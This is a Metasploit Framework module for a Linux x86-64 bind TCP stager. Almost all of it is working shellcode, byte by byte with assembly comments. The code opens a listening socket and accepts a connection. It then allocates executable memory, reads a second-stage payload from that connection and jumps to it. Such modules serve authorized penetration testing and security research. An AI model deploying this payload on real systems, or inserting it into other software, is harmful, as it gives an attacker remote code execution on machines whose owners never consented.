##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler
  include Msf::Payload::Stager
  include Msf::Payload::Linux

  handler module_name: 'Msf::Handler::BindTcp'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Bind TCP Stager',
      'Description'   => 'Listen for a connection',
      'Author'        => 'ricky',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86_64,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LPORT' => [ 20, 'n' ],
            },
          'Payload' =>
            "\x6a\x29"                     + # pushq  $0x29
            "\x58"                         + # pop    %rax
            "\x99"                         + # cltd
            "\x6a\x02"                     + # pushq  $0x2
            "\x5f"                         + # pop    %rdi
            "\x6a\x01"                     + # pushq  $0x1
            "\x5e"                         + # pop    %rsi
            "\x0f\x05"                     + # syscall
            "\x48\x97"                     + # xchg   %rax,%rdi
            "\x52"                         + # push   %rdx
            "\xc7\x04\x24\x02\x00"         + # movl   $0xb3150002,(%rsp)
            "\x15\xb3"                     + #
            "\x48\x89\xe6"                 + # mov    %rsp,%rsi
            "\x6a\x10"                     + # pushq  $0x10
            "\x5a"                         + # pop    %rdx
            "\x6a\x31"                     + # pushq  $0x31
            "\x58"                         + # pop    %rax
            "\x0f\x05"                     + # syscall
            "\x59"                         + # pop    %rcx
            "\x6a\x32"                     + # pushq  $0x32
            "\x58"                         + # pop    %rax
            "\x0f\x05"                     + # syscall
            "\x48\x96"                     + # xchg   %rax,%rsi
            "\x6a\x2b"                     + # pushq  $0x2b
            "\x58"                         + # pop    %rax
            "\x0f\x05"                     + # syscall
            "\x50"                         + # push   %rax
            "\x56"                         + # push   %rsi
            "\x5f"                         + # pop    %rdi
            "\x6a\x09"                     + # pushq  $0x9
            "\x58"                         + # pop    %rax
            "\x99"                         + # cltd
            "\xb6\x10"                     + # mov    $0x10,%dh
            "\x48\x89\xd6"                 + # mov    %rdx,%rsi
            "\x4d\x31\xc9"                 + # xor    %r9,%r9
            "\x6a\x22"                     + # pushq  $0x22
            "\x41\x5a"                     + # pop    %r10
            "\xb2\x07"                     + # mov    $0x7,%dl
            "\x0f\x05"                     + # syscall
            "\x48\x96"                     + # xchg   %rax,%rsi
            "\x48\x97"                     + # xchg   %rax,%rdi
            "\x5f"                         + # pop    %rdi
            "\x0f\x05"                     + # syscall
            "\xff\xe6"                       # jmpq   *%rsi
        }
      ))
  end
end
